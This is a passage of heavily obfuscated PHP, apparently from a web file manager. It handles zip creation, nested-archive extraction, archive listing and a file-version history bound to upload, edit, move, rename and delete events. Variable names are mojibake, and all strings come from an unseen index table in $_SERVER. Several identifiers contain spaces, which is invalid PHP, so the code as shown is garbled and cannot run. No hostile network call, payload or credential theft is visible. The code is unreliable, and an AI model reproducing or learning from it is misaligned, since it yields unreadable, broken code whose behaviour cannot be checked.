$½µõ÷„ƒ = self::init($íĞû¦†™); $˜æä•É = $½µõ÷„ƒ->getType() == $Ä”ÄåÇ²[120] ? $íĞû¦†™ : get_path_father($¦ÇÎÓ´ã->path); $˜æä•É = rtrim($˜æä•É, $Ä”ÄåÇ²[8]) . $Ä”ÄåÇ²[8]; mk_dir($˜æä•É); } else { $¬ŒÕ¶†œ = TEMP_FILES . $Ä”ÄåÇ²[1261] . time() . rand_string(8) . $Ä”ÄåÇ²[8]; mk_dir($¬ŒÕ¶†œ); file_put_contents($¬ŒÕ¶†œ . $Ä”ÄåÇ²[1262], $Ä”ÄåÇ²[12]); $˜æä•É = $¬ŒÕ¶†œ; } $Î«òºÙ“ = IO::info($˜æä•É); if (!$Î«òºÙ“ || !$Î«òºÙ“[$Ä”ÄåÇ²[246]]) { show_json(LNG($Ä”ÄåÇ²[1263]), !1); } $ë²¢«Ôµ = self::zipFileList($–™ÚÜ³, $¬ŒÕ¶†œ); foreach ($ë²¢«Ôµ as $Ê‚šÔ¢Ï => $Ø²ıóº) { $ë²¢«Ôµ[$Ê‚šÔ¢Ï] = self::iconvSystem($Ø²ıóº); } $½ûü“‰¼ = get_filename_auto($˜æä•É . $âÚ€Ú‹¾, $Ä”ÄåÇ²[12], $­·äåé); KodArchive::create(self::iconvSystem($½ûü“‰¼), $ë²¢«Ôµ); if (!IO::exist($½ûü“‰¼)) { if ($¬ŒÕ¶†œ) { del_dir($¬ŒÕ¶†œ); } write_log($Ä”ÄåÇ²[1264] . $½ûü“‰¼, $Ä”ÄåÇ²[400]); show_json(LNG($Ä”ÄåÇ²[1265]), !1); } if (!$¬ŒÕ¶†œ) { return $½ûü“‰¼; } $ò“Âàã¤ = self::move($½ûü“‰¼, $íĞû¦†™, $­·äåé); if ($¬ŒÕ¶†œ) { del_dir($¬ŒÕ¶†œ); } if (!$½ûü“‰¼) { write_log($Ä”ÄåÇ²[1266] . $½ûü“‰¼ . $Ä”ÄåÇ²[1267] . $íĞû¦†™, $Ä”ÄåÇ²[400]); show_json(LNG($Ä”ÄåÇ²[1265]), !1); } return $ò“Âàã¤; } public static function unzip($ğ÷Ü‹ÃÔ, $¯‰ƒ€÷¢, $Áœğ“Ë = "\x2d\61", $‡í Ä¯Ç = "\x72\145\x70\x6c\x61\143\x65") { $•„öòØæ =& $_SERVER[Ò°Ì”İ•]; $ˆÏà‡ = parent::info($ğ÷Ü‹ÃÔ); if (!$ˆÏà‡) { show_json(LNG($•„öòØæ[1268]), !1); } $¶ä¤•ªã = IO::infoFullSimple($¯‰ƒ€÷¢); if (!$¶ä¤•ªã) { $¯‰ƒ€÷¢ = IO::mkdir($¯‰ƒ€÷¢); } if (isset($¶ä¤•ªã[$•„öòØæ[204]]) && trim($¶ä¤•ªã[$•„öòØæ[98]], $•„öòØæ[8]) != trim($¯‰ƒ€÷¢, $•„öòØæ[8])) { $ô‰Ãµ˜é = KodIO::make($¶ä¤•ªã[$•„öòØæ[203]]); $‘Ÿ¾¡Ô§ = IO::fileNameAuto($ô‰Ãµ˜é, $¶ä¤•ªã[$•„öòØæ[32]], REPEAT_RENAME_FOLDER, !0); $¯‰ƒ€÷¢ = IO::mkdir($ô‰Ãµ˜é . $‘Ÿ¾¡Ô§); } $Áœğ“Ë = $Áœğ“Ë && $Áœğ“Ë != $•„öòØæ[1269] ? @json_decode($Áœğ“Ë, !0) : -1; $­ªçñÕÈ = self::unzipPart($ğ÷Ü‹ÃÔ, $Áœğ“Ë); if (!$­ªçñÕÈ || !IO::exist($­ªçñÕÈ[$•„öòØæ[243]])) { show_json(LNG($•„öòØæ[119]), !1); } $Çûú•Ç = $­ªçñÕÈ[$•„öòØæ[1270]][count($­ªçñÕÈ[$•„öòØæ[1270]]) - 1]; if ($Çûú•Ç[$•„öòØæ[1271]] == -1 || substr($Çûú•Ç[$•„öòØæ[32]], -1, 1) == $•„öòØæ[8]) { $û§ÌÙÎĞ = $­ªçñÕÈ[$•„öòØæ[1272]] . rand_string(10) . $•„öòØæ[8]; mk_dir($û§ÌÙÎĞ); $»íˆ‰õĞ = count($­ªçñÕÈ[$•„öòØæ[1270]]) == 1 ? IO::ext($ğ÷Ü‹ÃÔ) : get_path_ext($­ªçñÕÈ[$•„öòØæ[243]]); $œúËÒˆ´ = KodArchive::extract(self::iconvSystem($­ªçñÕÈ[$•„öòØæ[243]]), $û§ÌÙÎĞ, $Çûú•Ç[$•„öòØæ[1271]], $‘Ÿ¾¡Ô§, $»íˆ‰õĞ); self::unzipErrorCheck($œúËÒˆ´, array($•„öòØæ[1273], $ğ÷Ü‹ÃÔ, $»íˆ‰õĞ, $¯‰ƒ€÷¢, $­ªçñÕÈ)); Hook::trigger($•„öòØæ[1274], $û§ÌÙÎĞ); recursion_dir($û§ÌÙÎĞ, $ÇÒØò¡ä, $”È„Ğ³, 0); $ØÚ–´Ÿ¾ = array_merge($ÇÒØò¡ä, $”È„Ğ³); $ËÜšñƒ¬ = array(); foreach ($ØÚ–´Ÿ¾ as $Ñö®ƒ§Û) { $öÔìó°å = IO::move(self::iconvApp($Ñö®ƒ§Û), $¯‰ƒ€÷¢, $‡í Ä¯Ç); if ($öÔìó°å) { $ËÜšñƒ¬[] = $öÔìó°å; } } del_dir($û§ÌÙÎĞ); } else { $öÔìó°å = IO::move($­ªçñÕÈ[$•„öòØæ[243]], $¯‰ƒ€÷¢, $‡í Ä¯Ç, get_path_this($Çûú•Ç[$•„öòØæ[32]])); if ($öÔìó°å) { $ËÜšñƒ¬[] = $öÔìó°å; } } return $ËÜšñƒ¬ ? $ËÜšñƒ¬ : !1; } public static function unzipList($ÑÈ†ïòÚ) { $–¢ƒ¨Ó =& $_SERVER[Ò°Ì”İ•]; $÷…¤öÂ½ = isset($ÑÈ†ïòÚ[$–¢ƒ¨Ó[1275]]) ? $ÑÈ†ïòÚ[$–¢ƒ¨Ó[1275]] : !1; $µ—Ş÷ãÕ = isset($ÑÈ†ïòÚ[$–¢ƒ¨Ó[1271]]) ? @json_decode($ÑÈ†ïòÚ[$–¢ƒ¨Ó[1271]], !0) : -1; $•™æÑÎ = self::unzipPart($ÑÈ†ïòÚ[$–¢ƒ¨Ó[98]], $µ—Ş÷ãÕ); if (!$•™æÑÎ || !IO::exist($•™æÑÎ[$–¢ƒ¨Ó[243]])) { show_json(LNG($–¢ƒ¨Ó[119]), !1); } $ûü¸É = $•™æÑÎ[$–¢ƒ¨Ó[1270]][count($•™æÑÎ[$–¢ƒ¨Ó[1270]]) - 1]; $µ’“Ä‹Ì = in_array(IO::ext($•™æÑÎ[$–¢ƒ¨Ó[243]]), array($–¢ƒ¨Ó[400], $–¢ƒ¨Ó[1276], $–¢ƒ¨Ó[1277], $–¢ƒ¨Ó[1278], $–¢ƒ¨Ó[1279], $–¢ƒ¨Ó[1280])); if (!$÷…¤öÂ½ && ($ûü¸É[$–¢ƒ¨Ó[1271]] == -1 || $µ’“Ä‹Ì)) { $æØï²€é = $•™æÑÎ[$–¢ƒ¨Ó[1272]] . get_path_this($•™æÑÎ[$–¢ƒ¨Ó[243]]) . $–¢ƒ¨Ó[1281]; if (!IO::exist($æØï²€é)) { $ÏÎüåª® = $ûü¸É[$–¢ƒ¨Ó[1271]] == -1 ? get_path_ext(IO::pathThis($ÑÈ†ïòÚ[$–¢ƒ¨Ó[98]])) : get_path_ext($•™æÑÎ[$–¢ƒ¨Ó[243]]); $¬¢ÚÒ­ê = KodArchive::listContent(self::iconvSystem($•™æÑÎ[$–¢ƒ¨Ó[243]]), !0, $ÏÎüåª®); self::unzipErrorCheck($¬¢ÚÒ­ê, array($–¢ƒ¨Ó[1282], $ÑÈ†ïòÚ, $•™æÑÎ)); @file_put_contents($æØï²€é, json_encode($¬¢ÚÒ­ê[$–¢ƒ¨Ó[1283]])); } return @json_decode(IO::getContent($æØï²€é), !0); } IO::fileOut($•™æÑÎ[$–¢ƒ¨Ó[243]], $÷…¤öÂ½, get_path_this($ûü¸É[$–¢ƒ¨Ó[32]])); die; } private static function zipFileList($Œ””’„§, $…¯±¢›‰ = false) { $ÈÌÑÛÉğ =& $_SERVER[Ò°Ì”İ•]; $¨Ãúı† = array(); foreach ($Œ””’„§ as $…É­Á‘) { $ãü½Çİ¸ = $…É­Á‘[$ÈÌÑÛÉğ[98]]; if ($…¯±¢›‰) { $ãü½Çİ¸ = self::copy($…É­Á‘[$ÈÌÑÛÉğ[98]], $…¯±¢›‰, $ÈÌÑÛÉğ[892]); } else { $…øÏøÎ— = self::init($…É­Á‘[$ÈÌÑÛÉğ[98]]); if ($…øÏøÎ—->getType() == $ÈÌÑÛÉğ[120]) { $ãü½Çİ¸ = $…øÏøÎ—->path; } } if ($ãü½Çİ¸ && self::local()->exist($ãü½Çİ¸)) { $¨Ãúı†[$…É­Á‘[$ÈÌÑÛÉğ[98]]] = $ãü½Çİ¸; } } if (!empty($¨Ãúı†)) { return array_values($¨Ãúı†); } show_json(LNG($ÈÌÑÛÉğ[1242]), !1); } private static function localFilePath($¨òøõ®) { $„ß›ÒØ¼ =& $_SERVER[Ò°Ì”İ•]; $ŞàÉˆÅÔ = KodIO::parse($¨òøõ®); if ($ŞàÉˆÅÔ[$„ß›ÒØ¼[33]] == KodIO::KOD_SOURCE) { $”ûòÂ—± = Model($„ß›ÒØ¼[898])->fileInfoGet(KodIO::sourceID($¨òøõ®)); if (!$”ûòÂ—±[$„ß›ÒØ¼[98]]) { show_json($„ß›ÒØ¼[1284], !1); } $¨òøõ® = $”ûòÂ—±[$„ß›ÒØ¼[98]]; } $îĞ¥å«« = self::init($¨òøõ®); if ($îĞ¥å««->pathParse[$„ß›ÒØ¼[1228]]) { $¨òøõ® = $îĞ¥å««->pathParse[$„ß›ÒØ¼[1228]]; $îĞ¥å«« = self::init($¨òøõ®); } $Â‹’ÌÕº = $îĞ¥å««->getType(); if ($Â‹’ÌÕº == $„ß›ÒØ¼[120] || $Â‹’ÌÕº == $„ß›ÒØ¼[1285]) { if (!$îĞ¥å««->exist($îĞ¥å««->path)) { show_json(LNG($„ß›ÒØ¼[119]), !1); } return $îĞ¥å««->path; } return !1; } public static function unzipPart($®ÌÙĞãè, $¾Ùå¤ö¨ = -1) { $‘Ñ–ıªÔ =& $_SERVER[Ò°Ì”İ•]; $ê‘ºÉµÆ = IO::pathThis($®ÌÙĞãè); if (!$¾Ùå¤ö¨ || $¾Ùå¤ö¨ == -1) { $ÊÖò‹åŞ = array(array($‘Ñ–ıªÔ[32] => $ê‘ºÉµÆ, $‘Ñ–ıªÔ[1271] => -1)); $ÊÖò‹åŞ[0][$‘Ñ–ıªÔ[1286]] = $ÊÖò‹åŞ[0][$‘Ñ–ıªÔ[32]]; } else { if (is_array($¾Ùå¤ö¨)) { $ÊÖò‹åŞ = $¾Ùå¤ö¨; $¬ßş¹ˆ = count($ÊÖò‹åŞ) - 1; for ($±¥Ïáç¢ = 0; $±¥Ïáç¢ <= $¬ßş¹ˆ; $±¥Ïáç¢++) { $öÚµöƒü = $ÊÖò‹åŞ[$±¥Ïáç¢]; $ëØ¾Ò¾ò = get_path_this($öÚµöƒü[$‘Ñ–ıªÔ[32]]) . (checkExtSafe($öÚµöƒü[$‘Ñ–ıªÔ[32]]) ? $‘Ñ–ıªÔ[12] : $‘Ñ–ıªÔ[1287]); $ÊÖò‹åŞ[$±¥Ïáç¢][$‘Ñ–ıªÔ[1286]] = $‘Ñ–ıªÔ[1288] . intval($öÚµöƒü[$‘Ñ–ıªÔ[1271]]) . $‘Ñ–ıªÔ[474] . $ëØ¾Ò¾ò; if ($±¥Ïáç¢ == 0) { continue; } $ÊÖò‹åŞ[$±¥Ïáç¢][$‘Ñ–ıªÔ[1286]] = $ÊÖò‹åŞ[$±¥Ïáç¢ - 1][$‘Ñ–ıªÔ[1286]] . $‘Ñ–ıªÔ[1289] . $ÊÖò‹åŞ[$±¥Ïáç¢][$‘Ñ–ıªÔ[1286]]; } } } if (!is_array($ÊÖò‹åŞ) || count($ÊÖò‹åŞ) == 0) { return !1; } $´¬ıµÌˆ = $ÊÖò‹åŞ[count($ÊÖò‹åŞ) - 1]; if (!IO::exist($®ÌÙĞãè)) { return !1; } $ãÃ˜Üäö = TEMP_FILES . $‘Ñ–ıªÔ[1290] . kodIO::hashPathSafe($®ÌÙĞãè) . $‘Ñ–ıªÔ[8]; $œ­ÑÑÈ« = $ãÃ˜Üäö . $´¬ıµÌˆ[$‘Ñ–ıªÔ[1286]]; mk_dir($ãÃ˜Üäö); file_put_contents(TEMP_FILES . $‘Ñ–ıªÔ[1262], $‘Ñ–ıªÔ[12]); if (IO::exist($œ­ÑÑÈ«)) { return array($‘Ñ–ıªÔ[243] => $œ­ÑÑÈ«, $‘Ñ–ıªÔ[1270] => $ÊÖò‹åŞ, $‘Ñ–ıªÔ[1272] => $ãÃ˜Üäö); } $Â¢±—ò¿ = self::localFilePath($®ÌÙĞãè); if (!$Â¢±—ò¿) { $Â¢±—ò¿ = $ãÃ˜Üäö . $‘Ñ–ıªÔ[1291]; if (!IO::exist($Â¢±—ò¿)) { self::copy($®ÌÙĞãè, $ãÃ˜Üäö, !1, get_path_this($Â¢±—ò¿)); } } if (!$Â¢±—ò¿ || !IO::exist($Â¢±—ò¿)) { return !1; } if ($´¬ıµÌˆ[$‘Ñ–ıªÔ[1271]] == -1) { return array($‘Ñ–ıªÔ[243] => $Â¢±—ò¿, $‘Ñ–ıªÔ[1270] => $ÊÖò‹åŞ, $‘Ñ–ıªÔ[1272] => $ãÃ˜Üäö); } $¤éèü–ù = $Â¢±—ò¿; foreach ($ÊÖò‹åŞ as $±¥Ïáç¢ => $öÚµöƒü) { if (!$öÚµöƒü || $öÚµöƒü[$‘Ñ–ıªÔ[1271]] == $‘Ñ–ıªÔ[1269]) { break; } if (substr($öÚµöƒü[$‘Ñ–ıªÔ[32]], -1, 1) == $‘Ñ–ıªÔ[8]) { break; } $õ†ÖÕØƒ = in_array(get_path_ext($öÚµöƒü[$‘Ñ–ıªÔ[1286]]), array($‘Ñ–ıªÔ[400], $‘Ñ–ıªÔ[1276], $‘Ñ–ıªÔ[1277], $‘Ñ–ıªÔ[1278], $‘Ñ–ıªÔ[1279], $‘Ñ–ıªÔ[1280])); $¶ƒ¿àÓÖ = $±¥Ïáç¢ == count($ÊÖò‹åŞ) - 1 && $õ†ÖÕØƒ; $ŞÄ¤Ã¼´ = $ãÃ˜Üäö . $öÚµöƒü[$‘Ñ–ıªÔ[1286]]; $•Ò‹®¿¾ = $ãÃ˜Üäö . get_path_this($öÚµöƒü[$‘Ñ–ıªÔ[32]]); if (IO::exist($ŞÄ¤Ã¼´)) { $¤éèü–ù = $ŞÄ¤Ã¼´; continue; } $ı¨¬‹± = $±¥Ïáç¢ == 0 ? get_path_ext($ê‘ºÉµÆ) : get_path_ext($¤éèü–ù); $ÒèĞĞ ë = KodArchive::extract(self::iconvSystem($¤éèü–ù), $ãÃ˜Üäö, $öÚµöƒü[$‘Ñ–ıªÔ[1271]], $Õ¡Â¬‘Ş, $ı¨¬‹±); self::unzipErrorCheck($ÒèĞĞ ë, array($‘Ñ–ıªÔ[1292], $®ÌÙĞãè, $ÊÖò‹åŞ, $öÚµöƒü, $ŞÄ¤Ã¼´)); if (IO::exist($•Ò‹®¿¾)) { IO::rename($•Ò‹®¿¾, get_path_this($ŞÄ¤Ã¼´)); } $¤éèü–ù = $ŞÄ¤Ã¼´; } $œ­ÑÑÈ« = $¤éèü–ù; return array($‘Ñ–ıªÔ[243] => $¤éèü–ù, $‘Ñ–ıªÔ[1270] => $ÊÖò‹åŞ, $‘Ñ–ıªÔ[1272] => $ãÃ˜Üäö); } private static function unzipErrorCheck($ÊâœÉÄ, $¬è‚½Şœ = false) { $—æÔ²£ë =& $_SERVER[Ò°Ì”İ•]; if ($ÊâœÉÄ[$—æÔ²£ë[1293]]) { return !0; } write_log(array($—æÔ²£ë[1294], $ÊâœÉÄ, $¬è‚½Şœ), $—æÔ²£ë[1295]); show_json($—æÔ²£ë[1296] . json_encode($ÊâœÉÄ[$—æÔ²£ë[1283]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ƒÖÖÂ×Ù =& $_SERVER[Ò°Ì”İ•]; $ ğ¼ëå¾ = $GLOBALS[$ƒÖÖÂ×Ù[6]][$ƒÖÖÂ×Ù[103]]; if ($ ğ¼ëå¾[$ƒÖÖÂ×Ù[1297]] != 1) { return; } if ($ ğ¼ëå¾[$ƒÖÖÂ×Ù[1298]] <= 0) { return; } if (isset($_REQUEST[$ƒÖÖÂ×Ù[1299]]) && $_REQUEST[$ƒÖÖÂ×Ù[1299]] == $ƒÖÖÂ×Ù[102]) { return; } Hook::bind($ƒÖÖÂ×Ù[1300], $ƒÖÖÂ×Ù[1301]); Hook::bind($ƒÖÖÂ×Ù[1302], $ƒÖÖÂ×Ù[1303]); Hook::bind($ƒÖÖÂ×Ù[1304], $ƒÖÖÂ×Ù[1305]); Hook::bind($ƒÖÖÂ×Ù[1306], $ƒÖÖÂ×Ù[1307]); Hook::bind($ƒÖÖÂ×Ù[1308], $ƒÖÖÂ×Ù[1309]); Hook::bind($ƒÖÖÂ×Ù[1310], $ƒÖÖÂ×Ù[1311]); } public static function eventBeforeUpload($µ‡Ö¶óª) { if ($µ‡Ö¶óª[3] && $µ‡Ö¶óª[3] != REPEAT_REPLACE) { return; } $ïŸ­ğÜƒ = self::parsePath($µ‡Ö¶óª[0]); if (!$ïŸ­ğÜƒ) { return; } self::add($ïŸ­ğÜƒ); } public static function eventBeforeEdit($¿î’ÅÂ©) { $æË§¹¸ = self::parsePath($¿î’ÅÂ©[0]); if (!$æË§¹¸) { return; } self::add($æË§¹¸); } public static function eventBeforeCopyFile($µÑ‚â’½, $ŞºİÍ–Ï, $ĞÁ»ŸÔ, $Õ™¹ş„’, $»ó¢œ›é, $— —¨Å) { $÷ıÁ¼¾ =& $_SERVER[Ò°Ì”İ•]; if (isset($ĞÁ»ŸÔ->_data[$÷ıÁ¼¾[1232]]) && $ĞÁ»ŸÔ->_data[$÷ıÁ¼¾[1232]]) { return; } $Ù’Ê·Ë‹ = $ĞÁ»ŸÔ->getPathOuter($Õ™¹ş„’); $óó³«€ï = self::parsePath($Ù’Ê·Ë‹); if (!$óó³«€ï) { return; } self::add($óó³«€ï); } public static function eventBeforeRename($÷«¦Ÿ°á) { $çÊàÂßÊ =& $_SERVER[Ò°Ì”İ•]; $Ê™³¹í÷ = self::parsePath($÷«¦Ÿ°á[0]); if (!$Ê™³¹í÷) { return; } $±¬Şšéí = self::checkInHistory($Ê™³¹í÷); if (!$±¬Şšéí) { return; } if ($±¬Şšéí[$çÊàÂßÊ[33]] == $çÊàÂßÊ[243]) { $ÁÇ·í¢© = self::listData($Ê™³¹í÷); if ($ÁÇ·í¢© && $ÁÇ·í¢©[$çÊàÂßÊ[457]]) { self::moveHistory($Ê™³¹í÷, $÷«¦Ÿ°á[1]); } } else { IO::rename($±¬Şšéí[$çÊàÂßÊ[98]], $÷«¦Ÿ°á[1]); } } public static function eventBeforeMove($¤áú¥ˆ) { $ûØÇğ©ö =& $_SERVER[Ò°Ì”İ•]; $×ÚĞÇö† = self::parsePath($¤áú¥ˆ[0]); if (!$×ÚĞÇö†) { return; } $±„½¬¡ = self::parsePath($¤áú¥ˆ[1]); if (!$±„½¬¡) { return; } $Üë´©Ë = $¤áú¥ˆ[3]; $÷ÚÍèëÑ = self::checkInHistory($×ÚĞÇö†); if (!$÷ÚÍèëÑ) { return; } $€° ŸÑ = self::pathHistory($±„½¬¡); if ($÷ÚÍèëÑ[$ûØÇğ©ö[33]] == $ûØÇğ©ö[243]) { $ÇÕóˆıô = self::listData($×ÚĞÇö†); $­ºé¯‡ = rtrim($±„½¬¡, $ûØÇğ©ö[8]) . $ûØÇğ©ö[8] . ($Üë´©Ë ? $Üë´©Ë : get_path_this($×ÚĞÇö†)); $¤ø¤Ç¥¦ = self::listData($­ºé¯‡); if ($ÇÕóˆıô && $ÇÕóˆıô[$ûØÇğ©ö[457]] && $¤ø¤Ç¥¦ && $¤ø¤Ç¥¦[$ûØÇğ©ö[457]]) { return self::clear($×ÚĞÇö†); } if ($ÇÕóˆıô && $ÇÕóˆıô[$ûØÇğ©ö[457]]) { self::moveHistory($×ÚĞÇö†, $Üë´©Ë, $€° ŸÑ); } } else { IO::move($÷ÚÍèëÑ[$ûØÇğ©ö[98]], $€° ŸÑ, !1, $Üë´©Ë); self::clearEmptyFolder(IO::pathFather($÷ÚÍèëÑ[$ûØÇğ©ö[98]])); } } public static function eventAfterRemove($¤Áş¬á, $«µ„›“®) { $ÀŸ½Ä´· =& $_SERVER[Ò°Ì”İ•]; if (!$«µ„›“®) { return; } $ğù›ííõ = self::parsePath($¤Áş¬á[0]); if (!$ğù›ííõ) { return; } $«¾ÑÙù× = self::checkInHistory($ğù›ííõ); if (!$«¾ÑÙù×) { return; } if ($«¾ÑÙù×[$ÀŸ½Ä´·[33]] == $ÀŸ½Ä´·[243]) { $ê‰²š = self::listData($ğù›ííõ, !1); if ($ê‰²š && $ê‰²š[$ÀŸ½Ä´·[457]]) { self::clear($ğù›ííõ, !1); } } else { IO::remove($«¾ÑÙù×[$ÀŸ½Ä´·[98]]); self::clearEmptyFolder(IO::pathFather($«¾ÑÙù×[$ÀŸ½Ä´·[98]])); } } private static function checkInHistory($ˆÚ€óÈ) { $€ÉŸÄú = self::pathHistory($ˆÚ€óÈ); if (!IO::exist($€ÉŸÄú)) { $€ÉŸÄú .= $_SERVER[Ò°Ì”İ•][1312]; } return IO::exist($€ÉŸÄú) ? IO::info($€ÉŸÄú) : !1; } private static function parsePath($‚Ğ¹»šİ) { $é™ÕŸõÔ =& $_SERVER[Ò°Ì”İ•]; if (!$‚Ğ¹»šİ) { return !1; } if (isset($GLOBALS[$é™ÕŸõÔ[1313]]) && $GLOBALS[$é™ÕŸõÔ[1313]]) { return; } $ÛÄ‘å´ü = KodIO::parse($‚Ğ¹»šİ); $ïš™ç¡“ = $ÛÄ‘å´ü[$é™ÕŸõÔ[33]]; $‘ ŠˆÙ = !$ïš™ç¡“ || $ïš™ç¡“ == KodIO::KOD_IO || $ïš™ç¡“ == KodIO::KOD_SHARE_ITEM; if (!$‘ ŠˆÙ || !$ÛÄ‘å´ü[$é™ÕŸõÔ[1314]]) { return !1; } if (substr($‚Ğ¹»šİ, 0, strlen(DATA_PATH . $é™ÕŸõÔ[1315])) == DATA_PATH . $é™ÕŸõÔ[1315]) { return !1; } if ($ïš™ç¡“ == KodIO::KOD_SHARE_ITEM) { $¦œ£Öá = IO::init($‚Ğ¹»šİ); if ($¦œ£Öá->pathParse[$é™ÕŸõÔ[1228]]) { return self::parsePath($¦œ£Öá->pathParse[$é™ÕŸõÔ[1228]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $äëƒ®¬ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $é™ÕŸõÔ[1316]); foreach ($äëƒ®¬ as $¦Õ •¬†) { if (!$ïš™ç¡“ && substr($‚Ğ¹»šİ, 0, strlen($¦Õ •¬†)) == $¦Õ •¬†) { return !1; } } self::log($GLOBALS[$é™ÕŸõÔ[1223]] . $é™ÕŸõÔ[1317] . $‚Ğ¹»šİ); return $‚Ğ¹»šİ; } private static function pathHistory($–²ıöá) { $ËÛ²ş¤ =& $_SERVER[Ò°Ì”İ•]; $™ÜÈÅ— = self::$_historyBase . ltrim(KodIO::clear($–²ıöá), $ËÛ²ş¤[8]); $™ÜÈÅ— = str_replace(array($ËÛ²ş¤[1318]), array($ËÛ²ş¤[1319]), $™ÜÈÅ—); return $™ÜÈÅ—; } public static function log($Ëªøæ§±) { } public static function historyCount($Ò¢Œ”Œˆ) { $²í·Òê„ =& $_SERVER[Ò°Ì”İ•]; $†÷¨Üü¤ = array(); $‡»Öøúü = array(); foreach ($Ò¢Œ”Œˆ as $©ïöÎß‡) { $¤‰Ãé†¤ = get_path_father($©ïöÎß‡); if (!$‡»Öøúü[$¤‰Ãé†¤]) { $‡»Öøúü[$¤‰Ãé†¤] = array(); } $‡»Öøúü[$¤‰Ãé†¤][] = get_path_this($©ïöÎß‡); } foreach ($‡»Öøúü as $¤‰Ãé†¤ => $¤æøÓâ£) { $Á¸¯Éç = self::parsePath($¤‰Ãé†¤); if (!$Á¸¯Éç) { continue; } foreach ($¤æøÓâ£ as $á¥ç¹è) { $„è¶¦ç¢ = self::listData(rtrim($Á¸¯Éç, $²í·Òê„[8]) . $²í·Òê„[8] . $á¥ç¹è, !1); if ($„è¶¦ç¢ && $„è¶¦ç¢[$²í·Òê„[457]]) { $†÷¨Üü¤[rtrim($¤‰Ãé†¤, $²í·Òê„[8]) . $²í·Òê„[8] . $á¥ç¹è] = count($„è¶¦ç¢[$²í·Òê„[457]]); } } } return $†÷¨Üü¤; } public static function add($ß¤«è–ò) { $šôñ°§õ =& $_SERVER[Ò°Ì”İ•]; $ÑÁÇ–ÊØ = self::listData($ß¤«è–ò); if (!$ÑÁÇ–ÊØ) { return; } $ÔË¿Éº˜ = Model($šôñ°§õ[843])->get($šôñ°§õ[1320]); $Ë™ì°ö¯ = intval($GLOBALS[$šôñ°§õ[6]][$šôñ°§õ[103]][$šôñ°§õ[1298]]); $âÀŒ’ç = $ÔË¿Éº˜ == $šôñ°§õ[1321] ? min(5, $Ë™ì°ö¯) : $Ë™ì°ö¯; if ($Ë™ì°ö¯ <= 0) { return; } $‰Ù®·Ø = IO::info($ß¤«è–ò); $™¯™ÕÇÕ = $ÑÁÇ–ÊØ[$šôñ°§õ[457]]; if ($‰Ù®·Ø[$šôñ°§õ[90]] == 0) { return; } if ($‰Ù®·Ø[$šôñ°§õ[90]] >= 1024 * 1024 * 500) { return !1; } $â«Ã±‚î = IO::hashSimple($ß¤«è–ò); if ($™¯™ÕÇÕ && $™¯™ÕÇÕ[0][$šôñ°§õ[687]] == $â«Ã±‚î) { return !0; } if (array_key_exists($šôñ°§õ[246], $‰Ù®·Ø) && !$‰Ù®·Ø[$šôñ°§õ[246]]) { return !1; } $—ÓÇ·Åï = short_id(time()); $óöÏ¥É” = array($šôñ°§õ[487] => $—ÓÇ·Åï, $šôñ°§õ[687] => $â«Ã±‚î, $šôñ°§õ[32] => $‰Ù®·Ø[$šôñ°§õ[32]] . $šôñ°§õ[10] . date($šôñ°§õ[1322]) . rand_string(1), $šôñ°§õ[90] => $‰Ù®·Ø[$šôñ°§õ[90]], $šôñ°§õ[539] => USER_ID, $šôñ°§õ[244] => time(), $šôñ°§õ[1323] => $šôñ°§õ[12]); IO::mkdir($ÑÁÇ–ÊØ[$šôñ°§õ[1324]]); $ˆí¢–¯¿ = IO::copy($ß¤«è–ò, $ÑÁÇ–ÊØ[$šôñ°§õ[1324]], !1, $óöÏ¥É”[$šôñ°§õ[32]]); if (!$ˆí¢–¯¿) { self::clearEmptyFolder($ÑÁÇ–ÊØ[$šôñ°§õ[1324]]); return !1; } array_unshift($™¯™ÕÇÕ, $óöÏ¥É”); if (count($™¯™ÕÇÕ) > $âÀŒ’ç) { $ÁõÉ¯… = array_slice($™¯™ÕÇÕ, $âÀŒ’ç); foreach ($ÁõÉ¯… as $ı¬®¾öş) { IO::remove($ÑÁÇ–ÊØ[$šôñ°§õ[1324]] . $ı¬®¾öş[$šôñ°§õ[32]]); } $™¯™ÕÇÕ = array_slice($™¯™ÕÇÕ, 0, $âÀŒ’ç); } return self::saveData($ÑÁÇ–ÊØ[$šôñ°§õ[1325]], $™¯™ÕÇÕ); } public static function remove($¦İ¤àÀ, $±°óÛû) { $ß´•·ôÈ =& $_SERVER[Ò°Ì”İ•]; $¯‡¯ÆËü = self::listData($¦İ¤àÀ); $ç‘«Î† = array(); if (!$¯‡¯ÆËü) { return !1; } foreach ($¯‡¯ÆËü[$ß´•·ôÈ[457]] as $Ü•¶°üî) { if ($Ü•¶°üî[$ß´•·ôÈ[487]] == $±°óÛû) { IO::remove($¯‡¯ÆËü[$ß´•·ôÈ[1324]] . $Ü•¶°üî[$ß´•·ôÈ[32]]); continue; } $ç‘«Î†[] = $Ü•¶°üî; } return self::saveData($¯‡¯ÆËü[$ß´•·ôÈ[1325]], $ç‘«Î†); } public static function clear($åºåú ‘, $¼òè = true) { $“¯’”Ûˆ =& $_SERVER[Ò°Ì”İ•]; $‘Ÿ¿Â = self::listData($åºåú ‘, $¼òè); if (!$‘Ÿ¿Â) { return !1; } foreach ($‘Ÿ¿Â[$“¯’”Ûˆ[457]] as $ÒÕí×Ä¤) { IO::remove($‘Ÿ¿Â[$“¯’”Ûˆ[1324]] . $ÒÕí×Ä¤[$“¯’”Ûˆ[32]]); } return self::saveData($‘Ÿ¿Â[$“¯’”Ûˆ[1325]], array()); } public static function moveHistory($àÕ³çæ¼, $ä ƒé = '', $²‘ÙÄŸœ = '') { $Î¥¹¿Š =& $_SERVER[Ò°Ì”İ•]; $¼Ó°ü³· = self::listData($àÕ³çæ¼, !1); if (!$¼Ó°ü³· || !$¼Ó°ü³·[$Î¥¹¿Š[457]]) { return !1; } $ú¼Î¥È = $Î¥¹¿Š[1312]; $ä ƒé = $ä ƒé ? $ä ƒé : get_path_this($àÕ³çæ¼); $²‘ÙÄŸœ = $²‘ÙÄŸœ ? $²‘ÙÄŸœ : $¼Ó°ü³·[$Î¥¹¿Š[1324]]; $ä•Ğ¡ğœ = substr(get_path_this($¼Ó°ü³·[$Î¥¹¿Š[1325]]), 0, -strlen($ú¼Î¥È)); foreach ($¼Ó°ü³·[$Î¥¹¿Š[457]] as $°½íè¥˜ => $Ÿ½é¢¼İ) { $¤Œóèî¢ = $ä ƒé . substr($Ÿ½é¢¼İ[$Î¥¹¿Š[32]], 